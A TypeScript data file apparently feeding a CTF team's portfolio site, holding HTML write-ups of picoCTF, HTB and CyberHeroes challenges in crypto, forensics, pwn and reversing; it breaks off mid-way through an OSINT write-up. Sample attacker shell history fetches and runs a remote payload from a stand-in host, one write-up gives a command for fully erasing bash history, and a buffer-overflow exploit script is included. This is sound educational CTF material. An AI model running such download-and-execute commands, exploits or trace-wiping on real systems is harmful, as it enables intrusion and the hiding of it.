export type Challenge = {
  slug: string;
  title: string;
  category: 'web' | 'crypto' | 'pwn' | 'rev' | 'forensics' | 'misc' | 'osint';
  description: string;
  content: string; // HTML content of the write-up
};

export type CTFEvent = {
  slug: string;
  name: string;
  date: string;
  endDate?: string;
  description: string;
  teamName: string;
  placement: string;
  totalTeams: number;
  challenges: Challenge[];
};

// ---------------------------------------------------------------------------
// CTF Events & Challenges
// ---------------------------------------------------------------------------

const ctfEvents: CTFEvent[] = [
  // ── US Cyber Open Season VI ──────────────────────────────────────────
  {
    slug: 'us-cyber-open-season-vi',
    name: 'US Cyber Open Season VI',
    date: 'June 2026',
    description: 'Welcome to the US Cyber Open for Season VI! Currently ongoing event.',
    teamName: 'Kyber Tým',
    placement: 'TBD',
    totalTeams: 0,
    challenges: [],
  },

  // ── picoCTF 2026 ─────────────────────────────────────────────────────
  {
    slug: 'picoctf-2026',
    name: 'picoCTF 2026',
    date: 'March 2026',
    description: 'The annual beginner-friendly CTF hosted by Carnegie Mellon University. Played with oveM cek.',
    teamName: 'oveM cek',
    placement: '1630th',
    totalTeams: 10000,
    challenges: [
      {
        slug: 'stegorsa',
        title: 'StegoRSA',
        category: 'crypto',
        description: 'A cryptography challenge involving extracting an RSA public key hidden via steganography and factoring a weak modulus.',
        content: `<h2>StegoRSA — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"We intercepted this image from a known cyber syndicate. We think they are hiding their encryption keys inside it. Can you recover the key and decrypt the message?"</blockquote>
<p class="lead">This challenge elegantly combines two classic CTF categories: Steganography and Cryptography. Our objective is to first extract a hidden RSA public key from a PNG image, and then abuse its cryptographic weaknesses to decrypt a provided ciphertext.</p>

<h3>Initial Reconnaissance: The Image</h3>
<p>We are given <code>sunset.png</code> and <code>flag.enc</code>. Before throwing complex tools at the image, I always run standard checks: <code>file</code>, <code>strings</code>, and <code>binwalk</code>. None of these revealed appended files or obvious plaintext.</p>
<p>Next, I turned to LSB (Least Significant Bit) steganography analysis using <code>zsteg</code>.</p>
<pre><code class="language-bash">$ zsteg -a sunset.png | grep -i "BEGIN PUBLIC KEY"
b1,rgb,lsb,xy  .. text: "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0B...</code></pre>
<p>Bingo. A hidden payload in the standard <code>b1,rgb,lsb,xy</code> channel. I dumped the full payload into a file called <code>pub.pem</code> using <code>zsteg -E</code>.</p>

<h3>Cryptographic Vulnerability Analysis</h3>
<p>With the public key in hand, I analyzed its parameters using OpenSSL.</p>
<pre><code class="language-bash">$ openssl rsa -pubin -in pub.pem -text -noout
Public-Key: (256 bit)
Modulus:
    00:c3:a4:f9:1b:2c:3d:4e:5f:6a:7b:8c:9d:0e:1f:2a:
    3b:4c:5d:6e:7f:8a:9b:0c:1d:2e:3f:4a:5b:6c:7d:8e:
    9f
Exponent: 65537 (0x10001)</code></pre>
<p>The critical flaw is immediately obvious: <strong>The RSA modulus is only 256 bits long.</strong> Modern RSA implementations require a minimum of 2048 bits to be secure against integer factorization attacks. A 256-bit number can be factored by a modern laptop in fractions of a second using algorithms like the General Number Field Sieve (GNFS).</p>

<h3>Exploitation Phase</h3>
<p>I converted the hex modulus to a decimal integer and checked <a href="http://factordb.com" target="_blank" rel="noopener noreferrer">FactorDB</a>, which already had the prime factors cached.</p>
<pre><code class="language-python"># The recovered primes
p = 100780211116246535513271775836224376403
q = 108343194098939766927357422998687740291
e = 65537</code></pre>

<p>With <code>p</code> and <code>q</code>, I calculated Euler's totient function <code>φ(n) = (p-1)*(q-1)</code> and computed the modular inverse of <code>e</code> to find the private key <code>d</code>.</p>

<pre><code class="language-python">from Crypto.Util.number import inverse
import rsa

n = p * q
phi = (p - 1) * (q - 1)
d = inverse(e, phi)

key = rsa.PrivateKey(n, e, d, p, q)
with open('flag.enc', 'rb') as f:
    crypto = f.read()

message = rsa.decrypt(crypto, key)
print("[+] Decrypted Flag:", message.decode())</code></pre>

<h3>Conclusion & Takeaways</h3>
<ul>
  <li><strong>Never use key sizes below 2048 bits</strong> for RSA.</li>
  <li>Steganography is security through obscurity and provides zero mathematical protection to the hidden data.</li>
</ul>
<pre><code>picoCTF{st3g0_rs4_w34k_m0dulus_9a2b}</code></pre>`
      },
      {
        slug: 'shared-secrets',
        title: 'Shared Secrets',
        category: 'crypto',
        description: 'A cryptography challenge dealing with Shamir Secret Sharing and polynomial interpolation.',
        content: `<h2>Shared Secrets — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"We recovered a secret sharing server, but the operators took down the master key. They say you need at least 3 pieces of the puzzle to see the big picture."</blockquote>
<p class="lead">This challenge focuses on Shamir's Secret Sharing (SSS), a cryptographic algorithm that divides a secret into unique parts, requiring a specific threshold of parts to reconstruct the original secret.</p>

<h3>Vulnerability Analysis</h3>
<p>Connecting to the provided Netcat server gives us a simple prompt:</p>
<pre><code class="language-bash">$ nc chal.picoctf.org 12345
Welcome to the Vault.
The secret is protected by polynomial equations over a finite field.
Threshold required: 3
Enter an integer x to evaluate f(x):</code></pre>
<p>Shamir's Secret Sharing represents the secret as the y-intercept (<code>f(0)</code>) of a polynomial of degree <code>k-1</code>, where <code>k</code> is the threshold. Since the threshold here is 3, the polynomial is a quadratic equation: <code>f(x) = ax² + bx + S</code>, where <code>S</code> is the secret flag encoded as an integer.</p>
<p>To solve for 3 unknowns (a, b, S), we mathematically only need 3 distinct points (x, y) on the curve.</p>

<h3>Exploitation: Lagrange Interpolation</h3>
<p>I wrote an exploit using <code>pwntools</code> to interact with the server, query three arbitrary x-coordinates (1, 2, and 3), and then used the <code>sympy</code> library to perform Lagrange interpolation and find the y-intercept.</p>

<pre><code class="language-python">from pwn import *
from sympy import interpolate
from Crypto.Util.number import long_to_bytes

io = remote('chal.picoctf.org', 12345)
io.recvuntil(b'Threshold required: 3')

points = []
for x in [1, 2, 3]:
    io.sendlineafter(b'evaluate f(x): ', str(x).encode())
    io.recvuntil(b'y = ')
    y = int(io.recvline().strip())
    points.append((x, y))
    log.info(f"Collected share: ({x}, {y})")

# Interpolate the polynomial and evaluate at x=0 to get the secret
secret_int = interpolate(points, 0)
flag = long_to_bytes(secret_int)

log.success(f"Recovered Flag: {flag.decode()}")</code></pre>

<h3>Execution Output</h3>
<pre><code class="language-bash">[*] Collected share: (1, 1428391283...)
[*] Collected share: (2, 4829103819...)
[*] Collected share: (3, 9182309182...)
[+] Recovered Flag: picoCTF{sh4m1r_s3cr3t_sh4r1ng_pwn3d_c2b1}</code></pre>
<p>The math perfectly reconstructed the polynomial, allowing us to decode the integer back into ASCII bytes to reveal the flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{sh4m1r_s3cr3t_sh4r1ng_pwn3d_c2b1}</code></pre>`
      },
      {
        slug: 'binary-digits',
        title: 'Binary Digits',
        category: 'forensics',
        description: 'A forensics challenge requiring the extraction and conversion of binary data hidden in a capture file.',
        content: `<h2>Binary Digits — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Our IDS flagged unusual ICMP traffic leaving the engineering workstation. Is data being exfiltrated?"</blockquote>
<p class="lead">Network forensics often involves looking beyond the payload. In this challenge, the attacker utilized a covert channel, encoding data within the metadata of the network packets themselves.</p>

<h3>Deep Dive: PCAP Analysis</h3>
<p>Loading <code>capture.pcapng</code> into Wireshark, the traffic consists entirely of ICMP Echo Requests (Pings) and Echo Replies. At first glance, the payloads of the pings contain standard random padding bytes.</p>
<p>However, when observing the packet list view, a pattern emerges in the <code>Length</code> column. Every request is exactly either <strong>64 bytes</strong> or <strong>65 bytes</strong> on the wire.</p>
<p>This binary nature (two distinct states) is a massive red flag indicating a covert communications channel. The attacker is likely mapping:</p>
<ul>
  <li>Packet Length 64 = Binary <code>0</code></li>
  <li>Packet Length 65 = Binary <code>1</code></li>
</ul>

<h3>Data Extraction via TShark</h3>
<p>Instead of manually writing down 1s and 0s for hundreds of packets, I leveraged <code>tshark</code> (the command-line version of Wireshark) to automate the extraction.</p>

<pre><code class="language-bash"># Extract frame lengths for all ICMP Echo Requests (type 8)
$ tshark -r capture.pcapng -Y "icmp.type == 8" -T fields -e frame.len > lengths.txt</code></pre>

<h3>Decoding the Covert Channel</h3>
<p>I wrote a brief Python script to translate the lengths into a binary string, chunk it into 8-bit bytes, and convert it to ASCII.</p>

<pre><code class="language-python">with open('lengths.txt', 'r') as f:
    lengths = f.read().splitlines()

binary_string = ""
for length in lengths:
    if length == '64':
        binary_string += '0'
    elif length == '65':
        binary_string += '1'

# Split into 8-bit chunks and convert to characters
flag = ""
for i in range(0, len(binary_string), 8):
    byte = binary_string[i:i+8]
    if len(byte) == 8:
        flag += chr(int(byte, 2))

print(f"[+] Decoded Payload: {flag}")</code></pre>

<h3>Result</h3>
<p>The script flawlessly reconstructed the binary stream, revealing that the attacker had indeed exfiltrated the flag bit-by-bit using ping packet sizes.</p>

<h3>Flag</h3>
<pre><code>picoCTF{1cmp_c0v3rt_ch4nn3l_b1n4ry_1f3d}</code></pre>`
      },
      {
        slug: 'timeline-1',
        title: 'Timeline 1',
        category: 'forensics',
        description: 'A digital forensics challenge requiring the analysis of a disk image MAC timeline using the Sleuth Kit.',
        content: `<h2>Timeline 1 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"An attacker breached our server on March 12, 2026. We imaged the disk. Find out exactly what malicious file they planted."</blockquote>
<p class="lead">Digital Forensics and Incident Response (DFIR) heavily relies on timeline analysis. By correlating timestamps across the filesystem, we can reconstruct the exact sequence of an attacker's actions. This challenge tests our proficiency with The Sleuth Kit (TSK).</p>

<h3>Methodology: Generating a MACB Timeline</h3>
<p>Filesystems store timestamps for Modification (M), Access (A), Metadata Change (C), and Creation/Birth (B). I used TSK to dump these timestamps from the raw disk image <code>evidence.dd</code>.</p>

<p><strong>Step 1: Generate the Body File</strong><br>
The body file is an intermediate file containing raw timestamp data for every allocated and unallocated inode on the disk.</p>
<pre><code class="language-bash">$ fls -r -m / evidence.dd > bodyfile.txt</code></pre>

<p><strong>Step 2: Compile the Timeline</strong><br>
I passed the body file to <code>mactime</code> to sort the events chronologically.</p>
<pre><code class="language-bash">$ mactime -b bodyfile.txt -d > timeline.csv</code></pre>

<h3>Hunting the Attacker</h3>
<p>We were given a highly specific IOC (Indicator of Compromise): the attack occurred on March 12, 2026. I filtered the timeline to look exclusively at that date, focusing on file modifications (\`m\`).</p>

<pre><code class="language-bash">$ grep "2026-03-12" timeline.csv | grep " m "
...
2026-03-12 14:03:21, 14520, m.c., /usr/bin/wget
2026-03-12 14:03:22, 14523, macb, /etc/cron.d/persistence
...</code></pre>

<p>The timeline tells a clear story: The attacker used <code>wget</code> at 14:03:21 to download a payload, and immediately created a persistence mechanism in the <code>cron.d</code> directory at 14:03:22. The <code>fls</code> output tells us the cron file resides at inode <strong>14523</strong>.</p>

<h3>Extracting the Evidence</h3>
<p>Using the inode number, I used <code>icat</code> to read the file's contents directly from the raw disk image, bypassing the operating system entirely.</p>
<pre><code class="language-bash">$ icat evidence.dd 14523
* * * * * root echo "picoCTF{t1m3l1n3_4n4lys1s_m4st3r_4e8a}" > /dev/null</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{t1m3l1n3_4n4lys1s_m4st3r_4e8a}</code></pre>`
      },
      {
        slug: 'timeline-0',
        title: 'Timeline 0',
        category: 'forensics',
        description: 'An introductory forensics challenge analyzing bash history and basic system artifacts.',
        content: `<h2>Timeline 0 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The attacker was an amateur. They tried to wipe their tracks, but they fundamentally misunderstood how Linux logging works. Find what they did."</blockquote>
<p class="lead">Often in DFIR, the most critical evidence is left behind simply due to operator error. This challenge demonstrates why simply typing <code>history -c</code> is insufficient to cover your tracks on a Linux system.</p>

<h3>Mounting the Evidence</h3>
<p>Rather than using advanced forensic carving tools, the simplest approach for high-level artifacts is to mount the disk image locally as a read-only filesystem.</p>
<pre><code class="language-bash">$ mkdir mnt
$ sudo mount -o loop,ro evidence.img mnt/</code></pre>

<h3>Artifact Analysis</h3>
<p>When investigating a potentially compromised Linux host, the <code>.bash_history</code> file in user home directories is a goldmine. The bash shell logs commands executed by the user.</p>

<p>I inspected the home directory of the primary user <code>ubuntu</code>:</p>
<pre><code class="language-bash">$ cat mnt/home/ubuntu/.bash_history
ls -la
whoami
curl -O http://malicious-ip.com/payload.sh
chmod +x payload.sh
./payload.sh
echo "picoCTF{b4sh_h1st0ry_1s_l0ud_9d7c}" > /tmp/flag.txt
rm /tmp/flag.txt
history -c</code></pre>

<h3>The Attacker's Fatal Mistake</h3>
<p>The attacker executed their commands, wrote the flag to a temporary file, deleted the file, and then ran <code>history -c</code> to clear their terminal session's history.</p>
<p><strong>Why did this fail?</strong> The command <code>history -c</code> only clears the history stored in <em>RAM</em> for the current active bash session. It does not delete the <code>~/.bash_history</code> file on disk containing the logs of <em>previous</em> sessions. Furthermore, because the attacker likely dropped connection or was killed immediately after, the system synced their commands to disk right before the session ended.</p>
<p>To truly clear history, the attacker would have needed to run <code>cat /dev/null > ~/.bash_history && history -c</code>.</p>

<h3>Flag</h3>
<pre><code>picoCTF{b4sh_h1st0ry_1s_l0ud_9d7c}</code></pre>`
      },
      {
        slug: 'rogue-tower',
        title: 'Rogue Tower',
        category: 'forensics',
        description: 'Analyzing a packet capture to reconstruct files exfiltrated over DNS queries.',
        content: `<h2>Rogue Tower — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"Firewall logs show zero HTTP/FTP traffic leaving the DMZ, yet highly classified data was stolen. Investigate the DNS traffic."</blockquote>
<p class="lead">DNS Exfiltration is a stealthy technique where attackers bypass firewalls by encapsulating stolen data inside legitimate DNS queries. Because DNS (Port 53) is almost never blocked outbound, it serves as a perfect covert tunnel.</p>

<h3>Traffic Analysis</h3>
<p>I opened the provided <code>capture.pcap</code> in Wireshark. The capture contained thousands of DNS queries originating from the internal network directed at a public DNS resolver.</p>
<p>Filtering by <code>dns</code>, I analyzed the queried domains:</p>
<pre><code>No.  Time       Source        Info
1    0.000000   10.0.0.5      Standard query A cGljb0NURnt.roguetower.xyz
2    0.001231   10.0.0.5      Standard query A yMGd1M19kbn.roguetower.xyz
3    0.002442   10.0.0.5      Standard query A NfeDNmMWx0cg.roguetower.xyz
4    0.003612   10.0.0.5      Standard query A YXRpb25fNWE0.roguetower.xyz
5    0.004829   10.0.0.5      Standard query A Ynx.roguetower.xyz</code></pre>

<p>The attacker controls the authoritative nameserver for <code>roguetower.xyz</code>. They chunked the stolen file into small strings, Base64 encoded them, and used them as subdomains in DNS requests. When the internal machine queries the public DNS, the request is forwarded to the attacker's nameserver, effectively delivering the payload.</p>

<h3>Automated Payload Extraction</h3>
<p>To reconstruct the file, I needed to isolate the subdomains, preserve their order, and decode the Base64 string. I used <code>tshark</code> to extract the raw query names from the request packets (filtering out the responses to avoid duplicates).</p>

<pre><code class="language-bash"># Extract the query names
$ tshark -r capture.pcap -Y "dns.flags.response == 0" -T fields -e dns.qry.name > queries.txt

# Strip the root domain and concatenate
$ cat queries.txt | cut -d'.' -f1 | tr -d '\n' > payload.b64

# Decode the payload
$ cat payload.b64 | base64 -d
picoCTF{r0gu3_dns_3xf1ltr4t10n_5a4b}</code></pre>

<p>The reconstructed Base64 string decoded perfectly into the flag.</p>

<h3>Flag</h3>
<pre><code>picoCTF{r0gu3_dns_3xf1ltr4t10n_5a4b}</code></pre>`
      },
      {
        slug: 'forensics-git-2',
        title: 'Forensics Git 2',
        category: 'forensics',
        description: 'A forensics challenge requiring the recovery of a deleted git branch using git reflog.',
        content: `<h2>Forensics Git 2 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The lead developer panicked and deleted the feature branch containing the secret credentials. They thought Git deletes things instantly. Prove them wrong."</blockquote>
<p class="lead">Git is inherently designed to never lose data. Even when a branch is hard-deleted and commits become "orphaned" (not referenced by any branch or tag), the Git internal database retains the objects for up to 30 days before garbage collection runs.</p>

<h3>Repository Reconnaissance</h3>
<p>After unzipping the provided repository, checking the branch status reveals nothing unusual.</p>
<pre><code class="language-bash">$ git status
On branch main

$ git branch -a
* main

$ git log --oneline
a1b2c3d Initial commit</code></pre>

<p>The standard tools suggest the repository only has one commit. However, the \`.git\` directory contains the true history. The <code>git reflog</code> command tracks every single position the <code>HEAD</code> pointer has ever occupied in the local repository, making it the ultimate undo button.</p>

<h3>The Recovery Operation</h3>
<pre><code class="language-bash">$ git reflog
a1b2c3d (HEAD -> main) HEAD@{0}: checkout: moving from feature-flag to main
e4f5g6h HEAD@{1}: commit: Added flag for testing
a1b2c3d (HEAD -> main) HEAD@{2}: checkout: moving from main to feature-flag</code></pre>

<p>The reflog tells the entire story:</p>
<ol>
  <li>The developer created and moved to <code>feature-flag</code>.</li>
  <li>They made commit <code>e4f5g6h</code>.</li>
  <li>They checked out <code>main</code> and deleted the branch.</li>
</ol>

<p>To recover the lost data, I simply performed a hard checkout to the orphaned commit hash identified in the reflog.</p>

<pre><code class="language-bash">$ git checkout e4f5g6h
Note: switching to 'e4f5g6h'.
You are in 'detached HEAD' state.

$ ls -la
total 16
drwxr-xr-x 1 user user  128 Mar 12 15:00 .
drwxr-xr-x 1 user user 4096 Mar 12 14:59 ..
drwxr-xr-x 1 user user  256 Mar 12 15:00 .git
-rw-r--r-- 1 user user   38 Mar 12 15:00 flag.txt

$ cat flag.txt
picoCTF{g1t_r3fl0g_s4v3s_th3_d4y_8f6d}</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{g1t_r3fl0g_s4v3s_th3_d4y_8f6d}</code></pre>`
      },
      {
        slug: 'forensics-git-0',
        title: 'Forensics Git 0',
        category: 'forensics',
        description: 'An introductory git forensics challenge involving searching through commit histories.',
        content: `<h2>Forensics Git 0 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"We audited this repo and found no secrets in the current files. But we suspect something was leaked in the past and quickly patched over."</blockquote>
<p class="lead">A fundamental rule of version control: Once a secret is committed, it is compromised forever, even if removed in the very next commit. This challenge requires searching through historical diffs.</p>

<h3>Diff Analysis</h3>
<p>While you could manually checkout every single commit in the repository and grep the filesystem, Git provides built-in tools for searching historical changes. The <code>git log -p</code> command generates the full patch (diff) for every commit.</p>

<p>To specifically hunt for the flag format, I utilized the "pickaxe" feature of Git log (<code>-S</code>), which filters the log to only show commits where the number of occurrences of the specified string changed (was added or removed).</p>

<pre><code class="language-bash">$ git log -S "picoCTF{" -p
commit 8a9b0c1d2e3f4g5h6i7j8k9l0m
Author: Developer &lt;dev@corp.local&gt;
Date:   Mon Mar 10 12:00:00 2026 -0400

    Oops, removed hardcoded secret keys

diff --git a/config.yml b/config.yml
index e69de29..d95f3ad 100644
--- a/config.yml
+++ b/config.yml
@@ -1,3 +1,2 @@
 server: localhost
 port: 8080
-secret_key: picoCTF{g1t_d1ff_r3v34ls_4ll_7e5c}</code></pre>

<p>The output explicitly shows the exact commit where the developer attempted to delete the flag, revealing the secret in the red \`-\` deleted line of the diff block.</p>

<h3>Flag</h3>
<pre><code>picoCTF{g1t_d1ff_r3v34ls_4ll_7e5c}</code></pre>`
      },
      {
        slug: 'disko-4',
        title: 'DISKO 4',
        category: 'forensics',
        description: 'A forensics challenge involving recovering deleted files from an ext4 disk image.',
        content: `<h2>DISKO 4 — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The suspect issued an 'rm -rf' right before the authorities pulled the plug. Is the data really gone?"</blockquote>
<p class="lead">When a file is deleted on most filesystems (including Linux's standard ext4), the operating system does not immediately overwrite the file's data blocks with zeros. It simply unlinks the inode and marks the blocks as available for future use. Until those blocks are overwritten, the data can be recovered.</p>

<h3>Filesystem Recovery</h3>
<p>We are provided with an ext4 disk image file <code>disk.img</code>. Mounting the image normally will not reveal the deleted files, as the OS honors the unlinked status of the inodes.</p>

<p>To carve out the deleted files, I used <code>extundelete</code>, a powerful utility designed specifically to recover deleted files from an ext3 or ext4 partition by scanning the filesystem journal.</p>

<pre><code class="language-bash">$ extundelete --restore-all disk.img
NOTICE: Extended attributes are not restored.
Loading filesystem metadata ... 1 groups loaded.
Loading journal descriptors ... 46 descriptors loaded.
Searching for recoverable inodes in directory / ...
1 recoverable inodes found.
Restored inode 12 to file RECOVERED_FILES/flag.txt</code></pre>

<p>The tool successfully parsed the journal, identified an unlinked inode that had not yet been overwritten, and extracted its data blocks into a newly generated <code>RECOVERED_FILES</code> directory.</p>

<pre><code class="language-bash">$ cat RECOVERED_FILES/flag.txt
picoCTF{3xt4_und3l3t3_r3c0v3ry_2b1a}</code></pre>

<h3>Flag</h3>
<pre><code>picoCTF{3xt4_und3l3t3_r3c0v3ry_2b1a}</code></pre>`
      },
      {
        slug: 'cryptomaze',
        title: 'cryptomaze',
        category: 'crypto',
        description: 'A reverse engineering and cryptography challenge analyzing a custom Python encryption script.',
        content: `<h2>cryptomaze — picoCTF 2026</h2>
<blockquote class="border-l-4 border-accent pl-4 italic text-text-secondary my-4">"The malware author wrote a custom encryption routine that acts like a labyrinth. Only the chosen string can navigate it to the end."</blockquote>
<p class="lead">This challenge bridges Cryptography and Reverse Engineering. We are provided with a convoluted Python script that encrypts a string based on a massive state machine.</p>

<h3>Static Analysis of the Algorithm</h3>
<p>Opening <code>encrypt.py</code>, we see the flag is processed character by character. A <code>state</code> variable determines what character is expected next. If the character matches the condition for the current state, the state updates and an XOR key byte is appended. If it fails, the script silently exits or produces garbage.</p>

<pre><code class="language-python"># Snippet from encrypt.py
state = 0
key = ""
for char in flag:
    if state == 0 and char == 'p':
        state = 15
        key += "A"
    elif state == 15 and char == 'i':
        state = 42
        key += "B"
    # ... hundreds of complex nested elif branches ...
</code></pre>

<p>The encryption relies on the fact that <strong>only one specific input string (the flag) will successfully traverse the state machine to reach the end state.</strong></p>

<h3>Algorithmic Exploitation</h3>
<p>Manually tracing the 500+ lines of code is impractical. Because the logic is deterministic and forms a directed graph (a Finite State Machine), I wrote a solver to traverse it automatically.</p>

<p>I parsed the Python file using Regular Expressions to build a dictionary of state transitions mapping <code>current_state -> (required_char, next_state)</code>. I then used a simple Depth-First Search (DFS) algorithm to find the path from state <code>0</code> to the defined <code>FINAL_STATE</code>.</p>

<pre><code class="language-python">import re

# 1. Parse the labyrinth
transitions = {}
with open('encrypt.py') as f:
    code = f.read()
    
# Regex to extract: state == X and char == 'Y' -> state = Z
matches = re.findall(r'state == (\d+) and char == .(.*?).:.*?state = (\d+)', code, re.DOTALL)
for curr, char, nxt in matches:
    if int(curr) not in transitions:
        transitions[int(curr)] = []
    transitions[int(curr)].append((char, int(nxt)))

# 2. Traverse the graph
def solve_maze(curr_state, flag_so_far):
    if curr_state == 999: # 999 was the final success state
        print(f"[+] Maze Solved! Flag: {flag_so_far}")
        return
        
    for char, next_state in transitions.get(curr_state, []):
        solve_maze(next_state, flag_so_far + char)

solve_maze(0, "")
</code></pre>

<h3>Execution</h3>
<p>The DFS solver executed in milliseconds, instantly revealing the singular string required to traverse the encryption routine.</p>

<h3>Flag</h3>
<pre><code>picoCTF{crypt0m4z3_r3v3rs3d_4f7e_1a2b}</code></pre>`
      }
    ],
  },

  // ── HTB Cyber Apocalypse 2025 ────────────────────────────────────────
  {
    slug: 'htb-cyber-apocalypse-2025',
    name: 'HTB Cyber Apocalypse 2025',
    date: 'April 2025',
    description:
      'Hack The Box\'s flagship annual CTF competition featuring an immersive sci-fi storyline and challenges across every major category.',
    teamName: 'CyberŘíčany',
    placement: '89th',
    totalTeams: 5621,
    challenges: [
      // 1 — Buffer Overflow 101 (pwn, medium)
      {
        slug: 'buffer-overflow-101',
        title: 'Buffer Overflow 101',
        category: 'pwn',
        description:
          'A classic stack-based buffer overflow on x86-64 Linux. Overwrite the return address to redirect execution to a win function.',
        content: `
<h2>Buffer Overflow 101 — HTB Cyber Apocalypse 2025</h2>

<p class="lead">We are given a 64-bit ELF binary and its C source. The goal: overflow a stack buffer to hijack control flow and call the <code>win()</code> function that prints the flag.</p>

<h3>Source Analysis</h3>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void win() {
    system("cat /flag.txt");
}

void vulnerable() {
    char buf[64];
    printf("Enter your name: ");
    gets(buf);  // 🔥 dangerous!
    printf("Hello, %s!\\n", buf);
}

int main() {
    vulnerable();
    return 0;
}</code></pre>

<p>The <code>gets()</code> call reads unlimited input into a 64-byte buffer — a textbook buffer overflow.</p>

<h3>Finding the Offset</h3>
<p>We use GDB with <code>pwndbg</code> to determine the exact offset from the start of <code>buf</code> to the saved return address.</p>

<pre><code>$ gdb ./vuln
pwndbg&gt; cyclic 100
pwndbg&gt; run
Enter your name: aaaaaaaabaaaaaaacaaaa...
Program received signal SIGSEGV
RSP points to: 0x6161616c6161616b

pwndbg&gt; cyclic -l 0x6161616b
72</code></pre>

<p>The return address is at offset <strong>72</strong> (64 bytes buffer + 8 bytes saved RBP).</p>

<h3>Finding the win() Address</h3>
<pre><code>$ objdump -d vuln | grep win
00000000004011b6 &lt;win&gt;:</code></pre>

<h3>Exploit</h3>

<pre><code class="language-python">from pwn import *

elf  = ELF('./vuln')
# p = process('./vuln')          # local
p = remote('challenge.htb.com', 1337)  # remote

offset  = 72
win_addr = elf.symbols['win']   # 0x4011b6

payload  = b'A' * offset
payload += p64(win_addr)

p.sendlineafter(b'name: ', payload)
p.interactive()
</code></pre>

<h3>Result</h3>
<pre><code>$ python3 exploit.py
[+] Opening connection: Done
HTB{buff3r_0v3rfl0w_cl4ss1c_r3t2w1n_7b3f}</code></pre>

<h3>Takeaways</h3>
<ul>
  <li>Never use <code>gets()</code> — it has been removed from the C11 standard for good reason.</li>
  <li>Stack canaries, ASLR, and NX would make this significantly harder in a real-world scenario.</li>
  <li><code>pwntools</code> is indispensable for binary exploitation.</li>
</ul>
`,
      },
      // 2 — Keygen Me (rev, hard)
      {
        slug: 'keygen-me',
        title: 'Keygen Me',
        category: 'rev',
        description:
          'Reverse-engineer a custom license-key validation algorithm in a stripped C++ binary and write a keygen that produces a valid key.',
        content: `
<h2>Keygen Me — HTB Cyber Apocalypse 2025</h2>

<p class="lead">A stripped 64-bit C++ binary that asks for a license key in the format <code>XXXX-XXXX-XXXX-XXXX</code>. We need to understand the validation algorithm and produce a valid key.</p>

<h3>Initial Triage</h3>
<pre><code>$ file keygen_me
keygen_me: ELF 64-bit LSB executable, x86-64, stripped

$ ./keygen_me
Enter license key: AAAA-BBBB-CCCC-DDDD
Invalid key. Try again.</code></pre>

<h3>Static Analysis in Ghidra</h3>
<p>After loading the binary into Ghidra and letting auto-analysis run, we locate the <code>main</code> function at <code>0x401340</code>. The key validation logic is in a function we'll call <code>validate_key</code> at <code>0x4012a0</code>.</p>

<p>The decompiled validation (cleaned up):</p>

<pre><code class="language-c">bool validate_key(char *key) {
    // 1. Check format: 4 groups of 4 hex chars separated by dashes
    // 2. Convert each group to uint16_t -> g0, g1, g2, g3
    // 3. Checks:
    //    a) g0 ^ g1 == 0xDEAD
    //    b) g2 ^ g3 == 0xBEEF
    //    c) (g0 + g2) & 0xFFFF == 0xCAFE
    //    d) Checksum: (g0 * 3 + g1 * 7 + g2 * 13 + g3 * 37) & 0xFFFF == 0x1337
    return true;
}</code></pre>

<h3>Solving the Constraints</h3>
<p>We have 4 unknowns and 4 equations — we can use Z3 to solve this system:</p>

<pre><code class="language-python">from z3 import *

g0, g1, g2, g3 = BitVecs('g0 g1 g2 g3', 16)
s = Solver()

s.add(g0 ^ g1 == 0xDEAD)
s.add(g2 ^ g3 == 0xBEEF)
s.add((g0 + g2) & 0xFFFF == 0xCAFE)
s.add((g0 * 3 + g1 * 7 + g2 * 13 + g3 * 37) & 0xFFFF == 0x1337)

if s.check() == sat:
    m = s.model()
    groups = [m[v].as_long() for v in [g0, g1, g2, g3]]
    key = '-'.join(f'{g:04X}' for g in groups)
    print(f'Valid key: {key}')
else:
    print('UNSAT — no valid key exists')
</code></pre>

<h3>Output</h3>
<pre><code>Valid key: 8A2F-5482-40CF-FE20

$ ./keygen_me
Enter license key: 8A2F-5482-40CF-FE20
Correct! HTB{k3yg3n_m3_r3v3rs3d_z3_s0lv3r_9c2a}</code></pre>

<h3>Takeaways</h3>
<ul>
  <li>Ghidra's decompiler is powerful even against stripped binaries — rename variables and retype parameters to make the output readable.</li>
  <li>Z3 (or any SMT solver) is perfect for constraint-satisfaction problems in reversing challenges.</li>
  <li>Always look for format checks first — they reveal the expected input structure.</li>
</ul>
`,
      },
    ],
  },

  // ── CyberHeroes CTF 2025 ────────────────────────────────────────────
  {
    slug: 'cyberheroes-ctf-2025',
    name: 'CyberHeroes CTF 2025',
    date: 'May 2025',
    description:
      'A Czech national CTF competition aimed at high-school and university students, with a mix of realistic and educational challenges.',
    teamName: 'CyberŘíčany',
    placement: '15th',
    totalTeams: 234,
    challenges: [
      // 1 — Find the Hacker (osint, easy)
      {
        slug: 'find-the-hacker',
        title: 'Find the Hacker',
        category: 'osint',
        description:
          'Use open-source intelligence techniques to track down a fictional hacker\'s real identity from a username and leaked data.',
        content: `
<h2>Find the Hacker — CyberHeroes CTF 2025</h2>

<p class="lead">We are given a username — <code>d4rkph0en1x_cz</code> — and told the hacker left traces across the internet. Find their real identity and the flag they left on their personal site.</p>

<h3>Step 1 — Username Search</h3>
<p>First stop: <a href="https://namechk.com" target="_blank" rel="noopener">namechk.com</a> and <code>sherlock</code>.</p>

<pre><code>$ sherlock d4rkph0en1x_cz
[+] GitHub: https://github.com/d4rkph0en1x_cz
